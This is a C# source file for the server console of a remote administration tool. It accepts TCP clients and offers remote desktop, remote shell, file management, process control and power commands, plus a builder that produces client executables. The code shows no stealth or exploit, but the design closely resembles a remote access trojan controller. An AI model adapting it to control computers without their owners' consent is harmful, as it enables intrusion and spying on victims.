using System;
using System.Collections.ObjectModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;
using Newtonsoft.Json;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Server
{
    public partial class MainWindow : Window
    {
        private ObservableCollection<ConnectedClient> clients;
        private TcpListener listener;
        private int listenPort = 5900;
        private bool isRunning = false;

        public MainWindow()
        {
            InitializeComponent();
            clients = new ObservableCollection<ConnectedClient>();
            ClientsGrid.ItemsSource = clients;
        }

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            await StartServer();
        }

        private async Task StartServer()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, listenPort);
                listener.Start();
                isRunning = true;

                txtListeningPort.Text = listenPort.ToString();
                txtServerStatus.Text = $"Server is running on port {listenPort}";
                txtServerStatus.Foreground = System.Windows.Media.Brushes.Green;

                // Accept clients in background
                _ = Task.Run(async () => await AcceptClients());
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private bool ExtractEmbeddedClient(string outputPath)
        {
            try
            {
                // Try to find embedded client resource
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                string resourceName = assembly.GetManifestResourceNames()
                    .FirstOrDefault(r => r.EndsWith("RemoteAdmin.Client.exe"));

                if (resourceName == null)
                {
                    return false;
                }

                // Extract the embedded resource
                using (var stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                        return false;

                    using (var fileStream = File.Create(outputPath))
                    {
                        stream.CopyTo(fileStream);
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error extracting embedded client: {ex.Message}");
                return false;
            }
        }

        private string FindClientExe()
        {
            string clientExeName = "RemoteAdmin.Client.exe";
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            string[] possiblePaths = new[]
            {
                Path.Combine(baseDir, clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Debug", "net6.0", clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Debug", "net7.0", clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Debug", "net8.0", clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Release", "net6.0", "win-x64", "publish", clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Release", "net7.0", "win-x64", "publish", clientExeName),
                Path.Combine(baseDir, "..", "..", "..", "RemoteAdmin.Client", "bin", "Release", "net8.0", "win-x64", "publish", clientExeName),
            };

            foreach (var path in possiblePaths)
            {
                string fullPath = Path.GetFullPath(path);
                if (File.Exists(fullPath))
                {
                    return fullPath;
                }
            }

            return null;
        }

        private async Task AcceptClients()
        {
            while (isRunning)
            {
                try
                {
                    var tcpClient = await listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleClient(tcpClient));
                }
                catch (Exception ex)
                {
                    if (isRunning)
                    {
                        Console.WriteLine($"Error accepting client: {ex.Message}");
                    }
                }
            }
        }

        private async Task HandleClient(TcpClient tcpClient)
        {
            ConnectedClient client = null;

            try
            {
                var stream = tcpClient.GetStream();

                // Wait for initial client info
                var message = await NetworkHelper.ReceiveMessageAsync(stream);

                if (message is ClientInfoMessage clientInfo)
                {
                    client = new ConnectedClient
                    {
                        Id = Guid.NewGuid().ToString(),
                        ComputerName = clientInfo.ComputerName,
                        Username = clientInfo.Username,
                        OSVersion = clientInfo.OSVersion,
                        IPAddress = clientInfo.IPAddress,
                        PublicIP = clientInfo.PublicIP,
                        Status = "Online",
                        LastSeen = DateTime.Now,
                        Connection = tcpClient,
                        Stream = stream
                    };

                    // Add to UI
                    Dispatcher.Invoke(() =>
                    {
                        clients.Add(client);
                        UpdateClientCount();
                    });

                    // Listen for messages
                    while (tcpClient.Connected)
                    {
                        var msg = await NetworkHelper.ReceiveMessageAsync(stream);

                        if (msg == null)
                            break;

                        if (msg is HeartbeatMessage)
                        {
                            Dispatcher.Invoke(() =>
                            {
                                client.LastSeen = DateTime.Now;
                            });
                        }
                        else if (msg is ShellOutputMessage shellOutput)
                        {
                            // Route to shell window if open
                            Dispatcher.Invoke(() =>
                            {
                                client.ShellWindow?.AppendOutput(shellOutput.Output);
                            });
                        }
                        else if (msg is ProcessListResponseMessage processListResponse)
                        {
                            // Route to task manager window if open
                            Dispatcher.Invoke(() =>
                            {
                                client.TaskManagerWindow?.UpdateProcessList(processListResponse.Processes);
                            });
                        }
                        else if (msg is ServiceListResponseMessage serviceListResponse)
                        {
                            // Route to task manager window if open
                            Dispatcher.Invoke(() =>
                            {
                                client.TaskManagerWindow?.UpdateServiceList(serviceListResponse.Services);
                            });
                        }
                        else if (msg is OperationResultMessage operationResult)
                        {
                            // Show operation result
                            Dispatcher.Invoke(() =>
                            {
                                if (!operationResult.Success)
                                {
                                    MessageBox.Show(operationResult.Message, "Operation Failed", MessageBoxButton.OK, MessageBoxImage.Error);
                                }
                            });
                        }
                        else if (msg is DirectoryListResponseMessage dirResponse)
                        {
                            // Route to file manager window if open
                            Dispatcher.Invoke(() =>
                            {
                                client.FileManagerWindow?.UpdateDirectoryListing(dirResponse);
                            });
                        }
                        else if (msg is FileChunkMessage fileChunk)
                        {
                            // Route to file manager window for downloads
                            Dispatcher.Invoke(() =>
                            {
                                client.FileManagerWindow?.HandleFileChunk(fileChunk);
                            });
                        }
                        else if (msg is ScreenFrameMessage screenFrame)
                        {
                            Dispatcher.Invoke(() =>
                            {
                                client.RemoteDesktopWindow?.UpdateScreen(screenFrame.ImageData, screenFrame.Width, screenFrame.Height);
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Client handler error: {ex.Message}");
            }
            finally
            {
                if (client != null)
                {
                    Dispatcher.Invoke(() =>
                    {
                        client.Status = "Offline";
                        clients.Remove(client);
                        UpdateClientCount();
                    });
                }
                tcpClient?.Close();
            }
        }

        private void UpdateClientCount()
        {
            txtClientCount.Text = clients.Count.ToString();
        }

        private async void RestartServer_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (!int.TryParse(txtServerPort.Text, out int newPort))
                {
                    MessageBox.Show("Please enter a valid port number", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                // Stop current server
                isRunning = false;
                listener?.Stop();

                // Disconnect all clients
                foreach (var client in clients.ToList())
                {
                    client.Connection?.Close();
                }
                clients.Clear();

                // Start with new port
                listenPort = newPort;
                await StartServer();

                MessageBox.Show($"Server restarted on port {listenPort}", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error restarting server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void GenerateClient_Click(object sender, RoutedEventArgs e)
        {
            var builderWindow = new BuilderWindow();
            builderWindow.ShowDialog();
        }

        private void RemoteDesktop_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                if (selectedClient.RemoteDesktopWindow != null && selectedClient.RemoteDesktopWindow.IsLoaded)
                {
                    selectedClient.RemoteDesktopWindow.Activate();
                }
                else
                {
                    var desktopWindow = new RemoteDesktopWindow(selectedClient);
                    selectedClient.RemoteDesktopWindow = desktopWindow;
                    desktopWindow.Show();
                }
            }
        }

        private void RemoteShell_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if shell window is already open for this client
                if (selectedClient.ShellWindow != null && selectedClient.ShellWindow.IsLoaded)
                {
                    selectedClient.ShellWindow.Activate();
                }
                else
                {
                    // Create new shell window
                    var shellWindow = new ShellWindow(selectedClient);
                    selectedClient.ShellWindow = shellWindow;
                    shellWindow.Show();
                }
            }
        }

        private void TaskManager_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if task manager window is already open for this client
                if (selectedClient.TaskManagerWindow != null && selectedClient.TaskManagerWindow.IsLoaded)
                {
                    selectedClient.TaskManagerWindow.Activate();
                }
                else
                {
                    // Create new task manager window
                    var taskManagerWindow = new TaskManagerWindow(selectedClient);
                    selectedClient.TaskManagerWindow = taskManagerWindow;
                    taskManagerWindow.Show();
                }
            }
        }

        private async void PowerRestart_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Restart", "Are you sure you want to restart this computer?");
        }

        private async void PowerShutdown_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Shutdown", "Are you sure you want to shutdown this computer?");
        }

        private async void PowerSleep_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("Sleep", "Are you sure you want to put this computer to sleep?");
        }

        private async void PowerLogOff_Click(object sender, RoutedEventArgs e)
        {
            await SendPowerCommand("LogOff", "Are you sure you want to log off the current user?");
        }

        private async Task SendPowerCommand(string command, string confirmMessage)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                var result = MessageBox.Show(
                    $"{confirmMessage}\n\nComputer: {selectedClient.ComputerName}",
                    $"Confirm {command}",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning);

                if (result == MessageBoxResult.Yes)
                {
                    try
                    {
                        var powerMsg = new PowerCommandMessage
                        {
                            Command = command
                        };

                        await NetworkHelper.SendMessageAsync(selectedClient.Stream, powerMsg);
                        MessageBox.Show($"{command} command sent successfully", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error sending {command} command: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
            }
        }

        private void FileManager_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                // Check if file manager window is already open for this client
                if (selectedClient.FileManagerWindow != null && selectedClient.FileManagerWindow.IsLoaded)
                {
                    selectedClient.FileManagerWindow.Activate();
                }
                else
                {
                    // Create new file manager window
                    var fileManagerWindow = new FileManagerWindow(selectedClient);
                    selectedClient.FileManagerWindow = fileManagerWindow;
                    fileManagerWindow.Show();
                }
            }
        }


        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
            if (selectedClient != null)
            {
                selectedClient.Connection?.Close();
                clients.Remove(selectedClient);
                UpdateClientCount();
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);
            isRunning = false;
            listener?.Stop();

            foreach (var client in clients.ToList())
            {
                client.Connection?.Close();
            }
        }

        private void TabControl_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {

        }
    }
}